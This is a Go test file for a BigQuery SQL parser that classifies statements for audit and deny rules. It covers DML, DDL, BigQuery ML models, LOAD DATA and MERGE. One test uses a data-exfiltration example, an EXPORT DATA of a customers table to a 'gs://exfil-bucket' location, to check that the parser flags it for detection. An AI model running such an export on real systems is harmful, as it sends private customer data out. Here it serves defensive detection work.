package parser

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// BigQuery parser tests cover the same audit-row-relevant fields the
// PG / MySQL tests do (StatementType, TablesTouched, FunctionsCalled,
// HasMutatingNode, MutatingNodeType).
//
// Per [[scorer-is-ground-truth]]: the BigQuery parser is best-effort
// (no canonical Go grammar; xwb1989 + keyword pre-checks). Tests focus
// on the LOAD-BEARING dialect-shape signals.
//
// Coverage:
//
//   - SELECT / INSERT / UPDATE / DELETE / CREATE TABLE / DROP TABLE
//     (delegated to xwb1989)
//   - CREATE MODEL / CREATE OR REPLACE MODEL (BQ ML — billing+priv)
//   - DROP MODEL
//   - EXPORT DATA (the canonical BigQuery exfil shape)
//   - LOAD DATA (bulk GCS → table ingest)
//   - MERGE (BigQuery DML)
//   - Empty / garbage SQL — never panics

func bqParse(raw string) *ParsedStatement {
	return Parse(DialectBigQuery, raw)
}

func TestBigQuery_SimpleSelect(t *testing.T) {
	ps := bqParse("SELECT id FROM ds.users")
	require.NotNil(t, ps)
	assert.Equal(t, DialectBigQuery, ps.Dialect)
	assert.Equal(t, StmtSelect, ps.StatementType)
	assert.Equal(t, []string{"ds.users"}, ps.TablesTouched)
	assert.False(t, ps.HasMutatingNode)
}

func TestBigQuery_InsertUpdateDelete(t *testing.T) {
	cases := []struct {
		sql      string
		stmtType string
		mut      string
	}{
		{`INSERT INTO ds.orders (id) VALUES (1)`, StmtInsert, "INSERT"},
		{`UPDATE ds.orders SET status = 'paid' WHERE id = 1`, StmtUpdate, "UPDATE"},
		{`DELETE FROM ds.orders WHERE id = 1`, StmtDelete, "DELETE"},
	}
	for _, c := range cases {
		t.Run(c.stmtType, func(t *testing.T) {
			ps := bqParse(c.sql)
			assert.Equal(t, c.stmtType, ps.StatementType)
			assert.True(t, ps.IsDML)
			assert.True(t, ps.HasMutatingNode)
			assert.Equal(t, c.mut, ps.MutatingNodeType)
			assert.Equal(t, []string{"ds.orders"}, ps.TablesTouched)
		})
	}
}

func TestBigQuery_CreateDropTable(t *testing.T) {
	ps := bqParse(`CREATE TABLE ds.accounts (id INT64)`)
	assert.Equal(t, StmtDDL, ps.StatementType)
	assert.True(t, ps.IsDDL)

	ps2 := bqParse(`DROP TABLE ds.accounts`)
	assert.Equal(t, StmtDDL, ps2.StatementType)
	assert.True(t, ps2.IsDDL)
}

// CREATE MODEL — BQ ML model creation. Billing-affecting + creates a
// new artifact that may have downstream privilege effects.
func TestBigQuery_CreateModel(t *testing.T) {
	ps := bqParse(`CREATE MODEL ` + "`proj.ds.churn_predictor`" + ` OPTIONS(model_type='logistic_reg') AS SELECT * FROM ds.training_data`)
	assert.Equal(t, StmtDDL, ps.StatementType)
	assert.True(t, ps.IsDDL)
	assert.True(t, ps.HasMutatingNode)
	assert.Equal(t, bigqueryMutatingCreateModel, ps.MutatingNodeType)
	assert.Contains(t, ps.TablesTouched, "proj.ds.churn_predictor")
}

func TestBigQuery_CreateOrReplaceModel(t *testing.T) {
	ps := bqParse(`CREATE OR REPLACE MODEL ds.my_model OPTIONS(model_type='kmeans') AS SELECT * FROM ds.t`)
	assert.Equal(t, StmtDDL, ps.StatementType)
	assert.Equal(t, bigqueryMutatingCreateModel, ps.MutatingNodeType)
	assert.Contains(t, ps.TablesTouched, "ds.my_model")
}

func TestBigQuery_DropModel(t *testing.T) {
	ps := bqParse(`DROP MODEL ds.my_model`)
	assert.Equal(t, StmtDDL, ps.StatementType)
	assert.True(t, ps.HasMutatingNode)
	assert.Equal(t, bigqueryMutatingDropModel, ps.MutatingNodeType)
}

// EXPORT DATA — the canonical BigQuery exfil shape. Rule pack denies
// by default per the experimental-calibration starting point.
func TestBigQuery_ExportData(t *testing.T) {
	ps := bqParse(`EXPORT DATA OPTIONS(uri='gs://exfil-bucket/*.csv', format='CSV') AS SELECT * FROM ds.customers`)
	assert.Equal(t, StmtCopy, ps.StatementType,
		"EXPORT DATA classifies as StmtCopy (semantically a bulk write to GCS)")
	assert.True(t, ps.IsDML)
	assert.True(t, ps.HasMutatingNode)
	assert.Equal(t, bigqueryMutatingExportData, ps.MutatingNodeType,
		"MutatingNodeType MUST surface EXPORT-DATA for exfil-rule precision")
}

// LOAD DATA — bulk GCS → table ingest.
func TestBigQuery_LoadData(t *testing.T) {
	ps := bqParse(`LOAD DATA INTO ds.raw_events FROM FILES(uris=['gs://bucket/*.csv'], format='CSV')`)
	assert.Equal(t, StmtLoad, ps.StatementType)
	assert.True(t, ps.IsDML)
	assert.True(t, ps.HasMutatingNode)
	assert.Equal(t, bigqueryMutatingLoadData, ps.MutatingNodeType)
	assert.Contains(t, ps.TablesTouched, "ds.raw_events")
}

func TestBigQuery_LoadDataOverwrite(t *testing.T) {
	ps := bqParse(`LOAD DATA OVERWRITE INTO ds.staging FROM FILES(uris=['gs://b/*.json'], format='JSON')`)
	assert.Equal(t, StmtLoad, ps.StatementType)
	assert.True(t, ps.HasMutatingNode)
	assert.Equal(t, bigqueryMutatingLoadData, ps.MutatingNodeType)
}

// MERGE — BigQuery DML. xwb1989 doesn't model MERGE so the pre-check
// surfaces it.
func TestBigQuery_MergeInto(t *testing.T) {
	ps := bqParse(`MERGE INTO ds.target T USING ds.source S ON T.id = S.id WHEN MATCHED THEN UPDATE SET T.v = S.v`)
	assert.Equal(t, StmtMerge, ps.StatementType)
	assert.True(t, ps.IsDML)
	assert.True(t, ps.HasMutatingNode)
	assert.Equal(t, bigqueryMutatingMergeInto, ps.MutatingNodeType)
	assert.Contains(t, ps.TablesTouched, "ds.target")
}

// Empty / garbage — never panics.

func TestBigQuery_Empty(t *testing.T) {
	ps := bqParse("")
	require.NotNil(t, ps)
	assert.Equal(t, StmtUnknown, ps.StatementType)
}

func TestBigQuery_Garbage(t *testing.T) {
	ps := bqParse("zxcvbnm asdfghjkl !@#")
	assert.Equal(t, StmtUnparseable, ps.StatementType)
	assert.NotEmpty(t, ps.ParseErrors)
}

// Dialect-level smoke: dispatcher routes "bigquery" through parseBigQuery
// rather than the fallthrough error path.
func TestBigQuery_DispatcherRoutes(t *testing.T) {
	ps := Parse(DialectBigQuery, `SELECT 1`)
	require.NotNil(t, ps)
	assert.Equal(t, DialectBigQuery, ps.Dialect)
	assert.Equal(t, StmtSelect, ps.StatementType)
	assert.Empty(t, ps.ParseErrors)
}

// Snowflake dispatcher smoke (kept here so a single regression in
// parser.go's Parse switch is caught even if the snowflake_test.go
// file is ever rearranged).
func TestSnowflake_DispatcherRoutes(t *testing.T) {
	ps := Parse(DialectSnowflake, `SELECT 1`)
	require.NotNil(t, ps)
	assert.Equal(t, DialectSnowflake, ps.Dialect)
	assert.Equal(t, StmtSelect, ps.StatementType)
	assert.Empty(t, ps.ParseErrors)
}
